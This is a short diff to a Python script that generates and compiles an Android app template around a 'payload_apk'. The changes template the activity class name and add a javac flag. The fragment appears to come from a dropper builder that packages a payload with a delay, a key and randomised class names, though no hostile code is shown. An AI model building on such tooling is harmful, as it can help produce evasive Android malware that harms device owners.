@@ -62,7 +62,7 @@ import android.widget.TextView;
 import android.graphics.Color;
 import android.view.Gravity;
 
-public class MainActivity extends Activity {{
+public class {ACT} extends Activity {{
     @Override
     protected void onCreate(Bundle b) {{
         super.onCreate(b);
@@ -294,7 +294,7 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
             DELAY=DROP_DELAY_MS,
         ))
     with open(os.path.join(pkg_dir, f"{act_cls}.java"), "w", encoding="utf-8") as f:
-        f.write(_MAIN_ACTIVITY_JAVA.format(PKG=pkg))
+        f.write(_MAIN_ACTIVITY_JAVA.format(PKG=pkg, ACT=act_cls))
     with open(os.path.join(pkg_dir, f"{prov_cls}.java"), "w", encoding="utf-8") as f:
         f.write(_PROVIDER_JAVA.format(PKG=pkg, PROV=prov_cls))
 
@@ -337,6 +337,7 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
                 java_files.append(os.path.join(root, fn))
     _run([
         JAVAC_BIN, "-source", "8", "-target", "8",
+        "-Xlint:-options",
         "-encoding", "UTF-8",
         "-cp", ANDROID_JAR,
         "-d", classes_dir,
